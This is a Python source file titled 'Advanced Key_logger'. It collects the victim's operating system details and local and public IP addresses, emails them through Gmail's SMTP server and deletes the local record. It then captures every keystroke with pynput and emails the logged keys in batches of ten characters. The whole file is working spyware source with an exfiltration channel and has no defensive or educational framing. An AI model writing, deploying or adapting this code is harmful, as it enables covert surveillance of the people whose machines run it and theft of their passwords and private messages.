# Advanced Key_logger
import requests
import socket
import os
import platform
import getpass
import time
import smtplib
from pynput.keyboard import Key, Listener


password = getpass.getpass(prompt='password_to_email: ', stream=None)
logs = []
limit = 10 # gonna send the recoreded keystrokes after this limit of characters so increase it
words = ''



def sys_info():
	sys_os = platform.system()
	sys_arch = platform.machine()
	sys_release = platform.release()
	sys_version = platform.version()
	sys_uname = platform.uname()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	local_ip = s.getsockname()[0]
	r  = requests.get('https://api.ipify.org').text
	public_ip = r
	sys1 = f"[*] target_os = {sys_os}\n"
	sys2 = f"[*] target_os_arch = {sys_arch}\n"
	sys3 = f"[*] target_os_release = {sys_release}\n"
	sys4 = f"[*] target_os_version = {sys_version}\n"
	sys5 = f"[*] target_os_uname = {sys_uname}\n"
	sys6 = f"[*] target_local_ip = {local_ip}\n"
	sys7 = f"[*] target_public_ip = {public_ip}\n"
	with open('fsociety.txt', 'w') as p:
		p.write(sys1)
		p.write(sys2)
		p.write(sys3)
		p.write(sys4)
		p.write(sys5)
		p.write(sys6)
		p.write(sys7)
		p.close()

sys_info()

def sys_info_sender():
	email = "<your email goes here>"
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server.login(email, password)
	with open('fsociety.txt', 'r') as f:
		msg = f.read()
		server.sendmail(email, email, msg)
		os.system("rm fsociety.txt")
sys_info_sender()

def gmail():
	email = "<your email goes here>"
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server.login(email, password)
	msg = "".join(logs)
	server.sendmail(email, email, msg)
def fsociety(key):
	global keys
	global limit
	global words
	global logs

	if key == Key.space or key == Key.enter:
		logs.append(" ")
		words += '1' 
	elif key == Key.backspace or key == Key.left or key == Key.right or key == Key.up or key == Key.down or key == Key.esc:
		logs.append("")
		words += '1'
	else:
		logs.append(str(key).replace("'", ""))
		words += '1'
	if len(words) == limit:
		gmail()
		words = ''
		logs = []
def on_release(key):
	if key == Key.esc:
		return False
with Listener(on_press=fsociety, on_release=on_release) as l:
	l.join()
